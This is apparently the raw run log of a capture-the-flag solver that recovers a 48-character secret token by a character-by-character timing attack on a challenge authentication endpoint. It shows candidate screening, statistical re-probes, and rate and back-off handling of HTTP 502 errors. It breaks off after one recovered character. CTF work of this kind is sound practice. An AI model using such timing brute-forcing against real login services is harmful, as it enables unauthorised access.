+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [artifact] excluded 'A': phase-1 z=41.67; re-probe z=-0.79,-0.94
+  [artifact] excluded 'o': phase-1 z=29.50; re-probe z=0.05,1.29
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [artifact] excluded 'r': phase-1 z=15.38; re-probe z=-0.10,-0.23
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [artifact] excluded '0': phase-1 z=11.97; re-probe z=-0.64,-0.17
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [!] No relative winner: best=2.38z; re-running the full screen once...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  screening retry: 10/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  screening retry: 20/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening retry: 30/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening retry: 40/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  screening retry: 50/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] storm mode: sleeping 8.0s (request 3/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  screening retry: 60/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  screening retry: 62/62
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [artifact] excluded '5': phase-1 z=82.85; re-probe z=-1.26,0.38
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [artifact] excluded 'T': phase-1 z=9.59; re-probe z=-0.15,0.93
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+  [HTTP 502] retrying in 0.8s, cadence -> 9.00s (1/12)...
+  [HTTP 502] retrying in 1.6s, cadence -> 9.00s (2/12)...
+[supervisor 1 2026-08-23 21:56:13] launching solver
+[*] Target Endpoint: https://c2b8d32e-0d17-4559-a42c-a4e26d72aa0b.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='0'
+  [HTTP 502] wave watch; cadence 5.20s, cadence -> 5.20s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 6.76s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 8.79s (3/12)...
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[screen 8/62] cand='7'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 11/62] cand='a'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 18/62] cand='h'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[screen 29/62] cand='s'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 32/62] cand='v'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 33/62] cand='w'
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[screen 38/62] cand='B'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 41/62] cand='E'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 47/62] cand='K'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 51/62] cand='O'
+[screen 52/62] cand='P'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[screen 53/62] cand='Q'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 54/62] cand='R'
+[screen 55/62] cand='S'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 56/62] cand='T'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 62/62] cand='Z'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[guard] re-probe 'y' (1/2)
+[guard] re-probe 'y' (2/2)
+  [artifact] excluded 'y': phase-1 z=8.48; re-probe z=1.08,61.84
+[guard] re-probe 'E' (1/2)
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[guard] re-probe 'E' (2/2)
+  [artifact] excluded 'E': phase-1 z=8.39; re-probe z=-1.07,-0.44
+[guard] re-probe 'o' (1/2)
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[guard] re-probe 'o' (2/2)
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [artifact] excluded 'o': phase-1 z=8.20; re-probe z=2.14,0.76
+[sprt] cand='M' llr=-54.37 n=1
+[sprt] cand='7' llr=-49.43 n=1
+[deep] 1/18 cand='y'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[deep] 2/18 cand='E'
+[deep] 3/18 cand='o'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[deep] 4/18 cand='y'
+[supervisor 1 2026-08-23 22:21:51] launching solver
+[*] Target Endpoint: https://c2b8d32e-0d17-4559-a42c-a4e26d72aa0b.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='0'
+  [HTTP 502] wave watch; cadence 5.20s, cadence -> 5.20s (1/12)...
+[screen 2/62] cand='1'
+  [HTTP 502] wave watch; cadence 8.79s, cadence -> 8.79s (1/12)...
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+[screen 6/62] cand='5'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+[screen 9/62] cand='8'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[pulse] health=200 102ms
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[screen 16/62] cand='f'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+[screen 19/62] cand='i'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 117ms)
+[screen 20/62] cand='j'
+[pulse] health=502 106ms
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 104ms)
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] canary HTTP 502 -> breaker 115s
+[infra] canary HTTP 502 -> breaker 184s
+[infra] canary HTTP 502 -> breaker 240s
+[infra] recovered after 666.4s (canary ok, 468ms)
+[screen 23/62] cand='m'
+[pulse] health=200 105ms
+[screen 24/62] cand='n'
+[infra] STORM (rate=0.67) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] canary HTTP 502 -> breaker 115s
+[supervisor 1 2026-08-23 22:45:58] launching solver
+[*] Target Endpoint: https://4ee4122a-edfa-4c64-82c8-ad115ac438a0.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='0'
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+  [HTTP 502] wave watch; cadence 3.00s, cadence -> 3.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 3.90s (2/12)...
+[screen 5/62] cand='4'
+  [HTTP 502] wave watch; cadence 6.59s, cadence -> 6.59s (1/12)...
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.3s (canary ok, 94ms)
+[screen 8/62] cand='7'
+[pulse] health=200 99ms
+[infra] STORM (rate=0.67) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.3s (canary ok, 161ms)
+[screen 9/62] cand='8'
+[infra] STORM (rate=0.67) -> breaker 45s
+[infra] recovered after 45.1s (canary ok, 104ms)
+[screen 10/62] cand='9'
+[pulse] health=502 103ms
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+[screen 19/62] cand='i'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[pulse] health=502 93ms
+[pulse] health=502 -> paused 600s
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 29/62] cand='s'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+[screen 47/62] cand='K'
+[screen 48/62] cand='L'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+[screen 51/62] cand='O'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[screen 54/62] cand='R'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 100ms)
+[screen 55/62] cand='S'
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 112ms)
+[screen 56/62] cand='T'
+[pulse] health=200 118ms
+[screen 57/62] cand='U'
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] recovered after 54.1s (canary ok, 108ms)
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] recovered after 45.7s (canary ok, 735ms)
+[screen 62/62] cand='Z'
+[guard] re-probe 'Y' (1/2)
+[pulse] health=200 105ms
+[guard] re-probe 'Y' (2/2)
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 110ms)
+  [artifact] excluded 'Y': phase-1 z=102.00; re-probe z=4.53,0.73
+[guard] re-probe 'J' (1/2)
+[guard] re-probe 'J' (2/2)
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] canary HTTP 502 -> breaker 115s
+[infra] recovered after 241.5s (canary ok, 121ms)
+  [artifact] excluded 'J': phase-1 z=33.12; re-probe z=0.15,2.49
+[guard] re-probe 's' (1/2)
+[pulse] health=502 105ms
+[infra] STORM (rate=0.67) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] canary HTTP 502 -> breaker 115s
+[infra] recovered after 232.5s (canary ok, 105ms)
+[guard] re-probe 's' (2/2)
+[pulse] health=502 123ms
+[pulse] health=502 -> paused 600s
+  [artifact] excluded 's': phase-1 z=14.37; re-probe z=-0.18,0.60
+[guard] re-probe 'j' (1/2)
+[guard] re-probe 'j' (2/2)
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 105ms)
+  [artifact] excluded 'j': phase-1 z=9.66; re-probe z=0.51,-0.09
+[guard] re-probe 'x' (1/2)
+[guard] re-probe 'x' (2/2)
+  [artifact] excluded 'x': phase-1 z=8.87; re-probe z=1.02,-0.02
+[guard] re-probe '7' (1/2)
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 112ms)
+[guard] re-probe '7' (2/2)
+  [artifact] excluded '7': phase-1 z=8.85; re-probe z=0.93,0.08
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] recovered after 45.3s (canary ok, 254ms)
+[sprt] cand='F' llr=+207.21 n=1
+[OK] pos=1/48 char='F' z=13.96 delta=+86.13ms probes=75 wall=2517.7s
+[screen 1/62] cand='0'
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[pulse] health=200 105ms
+[screen 16/62] cand='f'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.3s (canary ok, 168ms)
+[screen 17/62] cand='g'
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.3s (canary ok, 186ms)
+[screen 18/62] cand='h'
+[pulse] health=200 110ms
+[screen 19/62] cand='i'
+[infra] STORM (rate=0.67) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 126.2s (canary ok, 113ms)
+[screen 20/62] cand='j'
+[infra] STORM (rate=0.67) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 118.2s (canary ok, 111ms)
+[screen 21/62] cand='k'
+[pulse] health=200 117ms
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] recovered after 45.1s (canary ok, 111ms)
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[screen 24/62] cand='n'
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.4s (canary ok, 216ms)
+[screen 25/62] cand='o'
+[pulse] health=200 110ms
+[screen 26/62] cand='p'
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] recovered after 45.1s (canary ok, 104ms)
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+[screen 34/62] cand='x'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 35/62] cand='y'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[pulse] health=200 117ms
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+[screen 45/62] cand='I'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 46/62] cand='J'
+[screen 47/62] cand='K'
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+[pulse] health=200 107ms
+[screen 51/62] cand='O'
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[screen 54/62] cand='R'
+[screen 55/62] cand='S'
+[screen 56/62] cand='T'
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+  [HTTP 502] wave watch; cadence 3.00s, cadence -> 3.00s (1/12)...
+[screen 61/62] cand='Y'
+[screen 62/62] cand='Z'
+[guard] re-probe 'n' (1/2)
+[guard] re-probe 'n' (2/2)
+  [HTTP 502] wave watch; cadence 3.00s, cadence -> 3.00s (1/12)...
+  [artifact] excluded 'n': phase-1 z=19.08; re-probe z=-1.81,-0.68
+[guard] re-probe 'g' (1/2)
+  [HTTP 502] wave watch; cadence 3.00s, cadence -> 3.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 3.90s (2/12)...
+[guard] re-probe 'g' (2/2)
+  [artifact] excluded 'g': phase-1 z=13.74; re-probe z=-2.05,-1.06
+[guard] re-probe '0' (1/2)
+[guard] re-probe '0' (2/2)
+  [artifact] excluded '0': phase-1 z=13.25; re-probe z=-1.34,-2.16
+[guard] re-probe 'f' (1/2)
+[guard] re-probe 'f' (2/2)
